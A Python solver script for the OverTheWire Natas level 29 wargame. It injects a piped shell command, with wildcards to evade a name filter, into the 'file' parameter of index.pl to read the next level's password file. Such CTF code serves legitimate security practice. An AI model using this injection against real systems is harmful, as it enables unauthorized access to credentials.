import re
from .base_solver import NatasSolver

class Natas29Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # Command injection with wildcard pattern to read password file
            parameter = "|cat /etc/n??as_webpass/n?tas30 "
            
            # Make request with command injection parameter
            response = self.make_request(
                path="index.pl",
                params={"file": parameter}
            )
            
            # Extract password using regex
            # The password should be the only 32-character hex string in response
            match = re.findall(r'</html>\n(.*)', response.text)
            if not match:
                print(f"[!] Response text: {response.text}")
                raise ValueError("Could not find password in response")
                
            return match[0].strip()
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas29: {str(e)}")




